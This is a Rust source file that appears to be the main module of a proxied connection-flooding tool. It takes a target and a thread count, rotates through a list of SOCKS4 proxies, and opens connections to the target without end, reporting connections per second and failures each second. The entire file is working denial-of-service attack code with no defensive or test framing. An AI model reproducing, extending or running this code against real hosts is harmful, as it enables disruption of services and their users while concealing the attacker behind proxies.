use std::{
    env,
    error::Error,
    process::exit,
    sync::{atomic::AtomicU64, Arc},
    time::Duration,
};

use args::get_args;
use log::info;
use proxies::get_proxies;
use simplelog::{Config, SimpleLogger};
use tokio::{sync::Semaphore, time::sleep};
use tokio_socks::tcp::Socks4Stream;
mod args;
mod proxies;
#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let mut args: Vec<String> = env::args().collect();
    args.remove(0);
    let (target, threads) = match get_args(args) {
        Some(value) => value,
        None => {
            exit(0);
        }
    };
    SimpleLogger::new(simplelog::LevelFilter::Warn, Config::default());
    tracing_subscriber::fmt::init();
    let proxies = Arc::new(get_proxies());

    let cps = Arc::new(AtomicU64::new(0));
    let cpsclone = cps.clone();
    let fails = Arc::new(AtomicU64::new(0));
    let failsclone = fails.clone();

    tokio::spawn(async move {
        loop {
            sleep(Duration::from_secs(1)).await;
            println!(
                "cps: {} fails: {}",
                cpsclone.swap(0, std::sync::atomic::Ordering::Relaxed),
                failsclone.swap(0, std::sync::atomic::Ordering::Relaxed),
            );
        }
    });
    let mut proxy_number = 0;

    let semaphore = Arc::new(Semaphore::new(threads as usize));

    loop {
        let sem = semaphore.clone();
        let permit = sem.acquire_owned().await;
        proxy_number += 1;
        if proxy_number == proxies.len() {
            proxy_number = 0;
        }
        let arc = proxies.clone();
        let cpsarc = cps.clone();
        let failsarc = fails.clone();

        tokio::spawn(async move {
            let _permit = permit;
            let proxy = arc.get(proxy_number).unwrap();

            let _ = match Socks4Stream::connect(proxy, target).await {
                Ok(value) => {
                    info!("{proxy_number} - success");
                    value.into_inner()
                }
                Err(_) => {
                    info!("{proxy_number} - fail");
                    failsarc.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    return 0;
                }
            };

            cpsarc.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            0
        });
    }
}
